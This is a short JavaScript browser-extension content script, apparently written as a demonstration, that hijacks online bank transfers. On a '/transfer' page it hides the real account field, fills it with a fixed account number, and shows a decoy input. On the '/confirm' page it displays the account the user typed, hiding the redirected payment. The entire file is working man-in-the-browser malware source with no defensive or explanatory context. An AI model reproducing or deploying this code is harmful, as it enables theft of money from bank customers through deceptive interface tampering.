
function test(text){chrome.storage.local.set({ acc: text }, function(){
  console.log('Value is set to ' + text);
});}


if(window.location.href.endsWith("/transfer")){
  while(1){
    if(document.body.innerHTML.search("<input id=\"account\"") > 0){
      var el = document.createElement("input");
      el.classList.add("form-control");
      el.addEventListener("change", function(){test(el.value);});
      var inp = document.getElementById("account");
      inp.style.display = "none";
      inp.value = "19991010";
      var form = document.getElementById("transfer-form");
      form.insertBefore(el, inp);
      break;
    }
  }
}
if(window.location.href.endsWith("/confirm")){
  chrome.storage.local.get(["acc"], function(items){
    console.log("I tutaj już mam" + items.acc);
    document.getElementsByTagName("li")[4].innerHTML="<b>Numer konta:</b> " + items.acc;
});
}
